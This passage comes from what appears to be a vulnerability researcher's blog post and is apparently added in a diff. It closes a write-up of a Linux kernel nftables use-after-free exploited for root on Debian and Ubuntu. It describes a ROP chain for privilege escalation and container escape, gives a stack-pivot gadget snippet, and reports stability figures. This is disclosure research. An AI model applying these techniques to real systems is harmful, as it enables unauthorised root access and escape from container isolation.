+The ROP chain escalates privileges by calling `commit_creds(&init_cred)` to grant root credentials, then invokes `__rcu_read_unlock()` to escape an RCU read-side critical section, and finally calls `switch_task_namespaces()` on pid 1’s task with `init_nsproxy()` to break out of the container’s namespace isolation before returning to usermode.
+
+### Ubuntu
+
+In general, the exploit mechanism for Ubuntu works similarly to the one for Debian. The main difference is that no `push_rbx_pop_rsp_pop_rbp` gadget \[8\] could be found in the Ubuntu kernel. Since both the `rdi` and `rbx` registers contain a pointer to the expression which is stored in the `blob_gen_0` object, the following stack pivoting gadget is used instead.
+
+```
+int off = 0;
+// the first two entries are used to mimic a fake nft_expr_ops structure
+// rule_data_fake_expr_ops[0] is the ops->eval function pointer
+
+rule_data_fake_expr_ops[off++] = push_rdi_pop_rsp_pop_r13_pop_rbp;  // push rdi ; adc byte ptr [rbx + 0x41], bl ; pop rsp ; pop r13 ; pop rbp ; xor edx, edx ; xor esi, esi ; xor edi, edi ; ret
+rule_data_fake_expr_ops[off++] = 0x1111111111111111;                // dummy data, popped into rbp by rule_data_fake_blob[x]=mov_rsp_rbp_pop_rbp
+```
+
+In both Debian and Ubuntu the return value of the `prepare_kernel_cred(&init_task)` function is stored in the `rax` register. In Debian the return value is also stored in the `rdi` register while this is not the case in Ubuntu. However, the return value of `prepare_kernel_cred(&init_task)` must be stored in the `rdi` register when the `commit_creds()` function is called such that `commit_creds(prepare_kernel_cred(&init_task))` is executed in total.
+
+Therefore, in contrast to Debian, after `prepare_kernel_cred(&init_task)` was called in Ubuntu, the value must be moved from the `rax` register to the `rdi` register before `commit_creds()` is called.
+
+## Conclusion
+
+In this blog post, we have seen how one incorrect exclamation mark introduced a use-after-free vulnerability which can be exploited by an unprivileged user on Debian and Ubuntu to escalate privileges to root.
+
+Although the exploit triggers the use-after-free vulnerability multiple times to leak the kernel base address, leak heap addresses, and hijack the control flow, the stability tests resulted in a stability of \>99% on an idle system.
+
+To stress test the exploit, we ran the Apache benchmark of the [Phoronix Test Suite](https://www.phoronix-test-suite.com/) which applies a lot of pressure on the kernel’s heap. Similar tests were performed in the paper [Playing for K(H)eaps: Understanding and Improving Linux Kernel Exploit Reliability](https://www.usenix.org/conference/usenixsecurity22/presentation/zeng). While running this benchmark, the exploit’s stability dropped to 80%.
+
+The exploit’s implementation used techniques such as context conservation (from the above K(H)eaps paper) to yield the observed stability results.
+
+## About Exodus Intelligence
+
+Our world class team of vulnerability researchers discover hundreds of exclusive Zero-Day vulnerabilities, providing our clients with proprietary knowledge before the adversaries find them. We also conduct N-Day research, where we select critical N-Day vulnerabilities and complete research to prove whether these vulnerabilities are truly exploitable in the wild. Our researchers create and use in-house agentic AI tooling to supplement parts of their vulnerability research and exploit development workflow. In addition to efficiency gains, we’re able to ensure AI-enabled research output maintains the same standards of quality as traditional research.
+
+For more information on our products and how we can help your vulnerability efforts, visit [www.exodusintel.com](https://www.exodusintel.com/) or contact [info@exodusintel.com](https://notes.austin.exodusintel.com/) for further discussion.
